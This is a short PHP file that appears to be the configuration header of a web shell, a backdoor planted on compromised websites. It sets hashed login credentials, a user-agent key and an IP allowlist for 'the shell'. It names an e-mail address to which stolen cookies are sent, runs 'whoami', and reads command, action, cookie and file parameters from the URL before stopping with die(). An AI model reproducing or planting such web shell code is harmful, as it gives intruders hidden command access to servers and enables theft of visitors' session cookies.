<?php
error_reporting(0);
// Configuration
$auth = 0;
$uakey = "724ea055b975621b9d679f7077257bd9"; // MD5 encoded user-agent
$IP = array("127.0.0.2","127.0.0.1"); // IP Addresses allowed to access shell
$email = ""; // E-mail address where cookies will be sent
$user = "55c4b3899b00d20543d41170d2775e8f"; // MD5 encoded User
$pass = "8634361d1a2e44420f44ef3612706bb5"; // MD5 encoded Password

// Global Variables
$version = "1.3 final";
$self = $_SERVER['PHP_SELF'];
$soft = $_SERVER["SERVER_SOFTWARE"];
$servinf = split("[:]", getenv('HTTP_HOST'));
$servip = $servinf[0];
$servport = $servinf[1];
$uname = php_uname();
$curuser = @exec('whoami');
$cmd = $_GET['cmd'];
$act = $_GET['act'];
$cmd = $_GET['cmd'];
$cookie = $_GET['cookie'];
$f = $_GET['f'];
die();
?>